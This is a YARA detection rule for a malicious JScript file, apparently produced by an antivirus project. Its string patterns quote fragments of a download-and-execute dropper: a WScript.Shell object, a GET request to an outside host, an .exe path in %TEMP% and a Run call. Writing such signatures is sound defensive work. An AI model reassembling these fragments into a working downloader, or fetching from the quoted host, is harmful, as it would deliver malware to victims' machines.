rule sig_20160328_ad171985a1d4f0d1869dfac76dcee8b4 {
  meta:
    description = "datamaliciousorder - file 20160328_ad171985a1d4f0d1869dfac76dcee8b4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f9cf2b02f8acd9c31d58703cd71d76e91ec4f972003ee7e4f1ed0a2b490bde58"

  strings:
    $s1  = "function Jhbczpl() {return Sfwwqzg[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"LyfsoIj8eNn9c.exe\";};" fullword ascii
    $s2  = "Cdlsahfhc[Tzbpfjpzvr](\"GET\", \"http://extragames.besaba.com/b3ysfa\", false);" fullword ascii
    $s3  = "do {WScript[Qmdbxt](Yueezoj() * 11)} while (Cdlsahfhc[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Zijmq(Nrrfa, Cfcedhwoz){return Nrrfa - Cfcedhwoz;};" fullword ascii
    $s5  = "var Sfwwqzg = function Xetpokwp() {return WScript[Jltyhvlps](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Lkfrve(Sikdovo){Sfwwqzg[\"Run\"](Sikdovo, Kueusfgzg, Kueusfgzg);};" fullword ascii
    $s7  = "function Ykosrvx() {return ((Hdxabdg == true) && (Hdxabdg == Nrgptni)) ? 1 : Kueusfgzg;};" fullword ascii
    $s8  = "function Yueezoj(){return 22;};" fullword ascii
    $s9  = "function Fyqvo(){return Jltyhvlps;};" fullword ascii
    $s10 = " while (Mlvlfu){" fullword ascii
    $s11 = "Nrgptni = true; " fullword ascii
    $s12 = "Hdxabdg = true; " fullword ascii
    $s13 = "var Tapovdt = false;" fullword ascii
    $s14 = "function Sjzsriikcj(Gzcbpfmd) {var Viefdyzr = (1, 2, 3, 4, 5, Gzcbpfmd); return Viefdyzr;};" fullword ascii
    $s15 = "return Zijmq(Oytvm, Oljnqmn);" fullword ascii
    $s16 = "function Cfiykbnhr(){return Rnlfpya;};" fullword ascii
    $s17 = "var Nrgptni = false;" fullword ascii
    $s18 = "var Hdxabdg = false;" fullword ascii
    $s19 = "function Ovolxnf()" fullword ascii
    $s20 = "var Kchfqwpus = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}